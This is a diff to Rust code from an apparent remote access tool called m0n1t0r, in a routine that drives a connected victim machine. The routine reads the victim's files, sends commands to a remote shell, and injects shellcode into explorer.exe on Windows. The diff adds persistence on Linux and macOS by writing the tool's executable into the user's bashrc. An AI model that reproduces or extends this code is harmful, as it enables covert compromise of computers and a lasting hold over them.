@@ -1,7 +1,9 @@
 use crate::ServerObj;
 use actix_web::web::Buf;
-use anyhow::{anyhow, Result};
+use anyhow::{Result, anyhow};
+use log::info;
 use m0n1t0r_common::{
+    autorun::Agent,
     client::{Client, TargetPlatform},
     fs::Agent as _,
     process::Agent as _,
@@ -16,13 +18,13 @@ pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
     let process_agent = client.get_process_agent().await?;
 
     client.ping().await?;
-    println!("version: {}", client.version().await?);
-    println!(
+    info!("version: {}", client.version().await?);
+    info!(
         "pwd at: {}",
         file_agent.current_directory().await?.to_string_lossy()
     );
-    println!("files at \"/\": {:?}", file_agent.list("/".into()).await?);
-    println!(
+    info!("files at \"/\": {:?}", file_agent.list("/".into()).await?);
+    info!(
         "Cargo.toml: \"{}\"",
         String::from_utf8_lossy(&file_agent.read("Cargo.toml".into()).await?)
     );
@@ -31,7 +33,7 @@ pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
     let mut stdin_tx = stdin_tx.into_inner().await?;
     let mut stdout_rx = stdout_rx.into_inner().await?;
     stdin_tx.send("echo hello\n".into()).await?;
-    println!(
+    info!(
         "echo hello: {}",
         String::from_utf8_lossy(
             stdout_rx
@@ -42,7 +44,11 @@ pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
         )
     );
 
-    if client.target_platform().await? == TargetPlatform::Windows {
+    let platform = client.target_platform().await?;
+    info!("target platform: {:?}", platform);
+
+    if platform == TargetPlatform::Windows {
+        info!("injecting shellcode into explorer.exe");
         process_agent
             .inject_shellcode_by_id(
                 process_agent
@@ -173,6 +179,12 @@ pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
                 Vec::new(),
             )
             .await?;
+    }
+
+    if platform == TargetPlatform::Linux || platform == TargetPlatform::MacOS {
+        let autorun_agent = client.get_autorun_agent().await?;
+        info!("adding current exe to bashrc");
+        autorun_agent.add_current_user_bashrc().await?;
     }
 
     Ok(())
